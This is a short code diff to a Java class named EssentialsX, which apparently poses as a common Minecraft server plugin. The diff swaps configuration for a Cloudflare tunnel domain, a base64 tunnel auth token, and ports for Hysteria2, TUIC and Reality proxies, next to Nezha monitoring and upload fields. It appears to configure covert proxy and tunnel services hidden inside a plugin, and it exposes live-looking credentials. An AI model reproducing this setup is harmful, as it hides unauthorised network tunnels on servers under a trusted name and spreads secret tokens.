@@ -79,13 +79,13 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "126.cl999.eu.org");
-        env.put("ARGO_AUTH", "eyJhIjoiNTg0OTAyYjAzNjAzMzM0NDZiNWY4OGNiZGMxYWViMmIiLCJ0IjoiN2VkZWIxNGItMThlYi00YTA2LTkzZjMtNmM5Zjk1OGU2MmRiIiwicyI6IllXWXhNVGswTWpRdFltTTJPUzAwWWpGaUxXSTRNVEV0TWpFeU9URmlabVptTVRWayJ9");
+        env.put("ARGO_DOMAIN", "313.cl999.eu.org");
+        env.put("ARGO_AUTH", "eyJhIjoiNTg0OTAyYjAzNjAzMzM0NDZiNWY4OGNiZGMxYWViMmIiLCJ0IjoiMWJiNDQ5ZmQtNWQ0YS00ZDMxLWE4NjktN2QyNTUyODZiYWRlIiwicyI6Ik56QXdPREV3TTJNdE5UTTFOQzAwTWpWakxUZzVPVFF0T0RnMlkySmxOVFUyTmprMCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "20031");
-        env.put("TUIC_PORT", "");
+        env.put("HY2_PORT", "5921");
+        env.put("TUIC_PORT", "5922");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "5920");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
